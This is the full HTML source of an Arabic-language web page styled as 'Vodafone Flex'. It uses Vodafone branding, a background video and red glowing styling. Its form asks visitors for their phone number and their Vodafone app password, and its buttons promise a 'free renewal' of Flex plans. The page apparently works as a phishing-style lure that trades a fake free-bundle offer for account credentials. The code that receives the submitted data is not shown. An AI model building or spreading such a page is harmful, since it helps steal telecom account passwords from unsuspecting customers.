<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Vodafone Flex</title>
  <style>
    body {
      margin:0; padding:0;
      font-family:Tahama,Arial;
      display:flex; justify-content:center; align-items:center;
      min-height:100vh;
      color:#fff;
      overflow:hidden;
    }

    /* فيديو الخلفية */
    #bg-video {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      object-fit: cover;
      z-index: -1;
    }

    .box {
      width:95%; max-width:400px;
      padding:20px;
      border-radius:15px;
      background:rgba(0,0,0,0.7);
      box-shadow:0 0 20px red;
      text-align:center;
      position: relative;
      z-index: 1;
    }
    .logo {
      width:120px; height:120px;
      border-radius:50%;
      margin:0 auto 15px;
      display:block;
      box-shadow:0 0 15px #f00;
    }
    h2 {margin:10px 0 20px;color:#ff8080;}
    input {
      width:100%; padding:12px; margin:10px 0;
      border-radius:10px; border:none;
      font-size:16px; box-sizing:border-box;
      background:#222;color:#fff;
    }
    button {
      width:48%; padding:12px; margin:10px 1%;
      border-radius:10px; border:none;
      font-size:16px; cursor:pointer;
      color:#fff;
      background:linear-gradient(45deg,#f00,#800);
      box-shadow:0 0 15px #f00;
    }
    .msg {margin-top:15px;font-weight:bold;color:#ff8080}
    p {margin-top:20px;font-size:13px;color:#aaa}
    .btn-group {display:flex;justify-content:space-between;}
  </style>
</head>
<body>
  <!-- خلفية الفيديو -->
  <video autoplay muted loop id="bg-video">
    <source src="rttt.mp4" type="video/mp4">
    <source src="rttt.webm" type="video/webm">
    متصفحك لا يدعم الفيديو
  </video>

  <div class="box">
    <img src="rr.png" alt="Vodafone Flex" class="logo">
    <h2>Vodafone Flex</h2>
    <form method="post">
      <input type="text" name="number" placeholder="📱 أدخل رقمك" required>
      <input type="password" name="password" placeholder="🔑 قوم بكتابة باسورد تطبيق فودافون" required>
      <div class="btn-group">
        <button type="submit" name="plan" value="Flex260">المـطور</button>
        <button type="submit" name="plan" value="Flex300">تجديد مجانا</button>
      </div>
    </form>
    <p>© جميع الحقوق محفوظة رونــي الـبحيره</p>
  </div>
</body>
</html>
